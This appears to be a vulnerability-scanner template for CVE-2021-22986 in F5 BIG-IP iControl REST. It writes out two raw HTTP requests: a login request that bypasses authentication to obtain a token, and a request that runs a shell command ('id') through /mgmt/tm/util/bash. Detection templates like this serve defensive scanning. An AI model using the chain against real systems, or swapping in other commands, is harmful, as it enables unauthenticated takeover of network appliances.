id: CVE-2021-22986

info:
  name: F5 BIG-IP iControl REST - Remote Command Execution
  author: rootxharsh,iamnoooob
  severity: critical
  description: F5 BIG-IP iControl REST interface is susceptible to an unauthenticated remote command execution vulnerability.
  reference:
    - https://attackerkb.com/topics/J6pWeg5saG/k03009991-icontrol-rest-unauthenticated-remote-command-execution-vulnerability-cve-2021-22986
    - https://support.f5.com/csp/article/K03009991
    - https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-22986
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2021-22986
  tags: bigip,cve,cve2021,rce,mirai,cisa

requests:
  - raw:
      - |
        POST /mgmt/shared/authn/login HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        Authorization: Basic YWRtaW46
        Content-Type: application/json
        Cookie: BIGIPAuthCookie=1234

        {"username":"admin","userReference":{},"loginReference":{"link":"http://localhost/mgmt/shared/gossip"}}
      - |
        POST /mgmt/tm/util/bash HTTP/1.1
        Host: {{Hostname}}
        Accept-Language: en
        X-F5-Auth-Token: {{token}}
        Content-Type: application/json

        {"command":"run","utilCmdArgs":"-c id"}

    extractors:
      - type: regex
        part: body
        internal: true
        name: token
        group: 1
        regex:
          - "([A-Z0-9]{26})"

      - type: regex
        part: body
        group: 1
        regex:
          - "\"commandResult\":\"(.*)\""

    matchers:
      - type: word
        words:
          - "commandResult"
          - "uid="
        condition: and

# Enhanced by mp on 2022/05/05
